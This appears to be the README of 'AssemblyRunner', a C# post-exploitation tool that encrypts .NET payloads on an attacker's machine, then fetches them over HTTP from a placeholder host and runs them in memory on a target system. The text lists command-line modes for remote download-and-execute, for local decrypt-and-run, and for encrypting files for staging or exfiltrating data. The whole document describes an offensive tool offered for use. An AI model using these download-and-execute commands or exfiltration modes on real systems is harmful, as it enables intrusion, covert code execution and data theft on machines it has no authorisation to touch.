# AssemblyRunner

C# Binary that is deseigned to encrypt, decrypt, as well as retreive over HTTP C# assemblies and execute in-memory on a target system.

Overall goal was to be able to encrypt payload on attacker controlled system, transfer this binary, and then remotely retreive encrypted binary and execute in-memory on a target system.

Functionality

.Net Exe Run in-memory with Arguments:

--Run remote .net exe (remote exe is b64 no encryption)
AssemblyRunner.exe -net http://IP/File(b64) "Arguments"

--Local .net exe File decrypt and run
AssemblyRunner.exe -rlocal PASSWORD File_to_Decrypt_and_run "Arguments"

--Remote .net File decrypt and run
AssemblyRunner.exe -rdec PASSWORD http://IP/File "Arguments"


.Net Exe Run in-memory without Arguments:

--Run remote .net exe (remote exe is b64 no encryption)
AssemblyRunner.exe -netno http://IP/File(b64)

--Local .net exe File decrypt and run
AssemblyRunner.exe -rlocalno PASSWORD File_to_Decrypt_and_run

--Remote .net File decrypt and run
AssemblyRunner.exe -rdecno PASSWORD http://IP/File


File Encryption only:

--Encrypt Remote exe and download local, saved as encrypt_remote.txt
AssemblyRunner.exe -enc PASSWORD http://IP/File
--Encrypt Local File, used for prestaging or exfil of data, saved as encrypt_local.txt
AssemblyRunner.exe -file PASSWORD FILE/TO/ENC
--Local File Decrypt for exfil, not on target system, file saved as decrypted.txt
AssemblyRunner.exe -decfile PASSWORD File_to_Decrypt
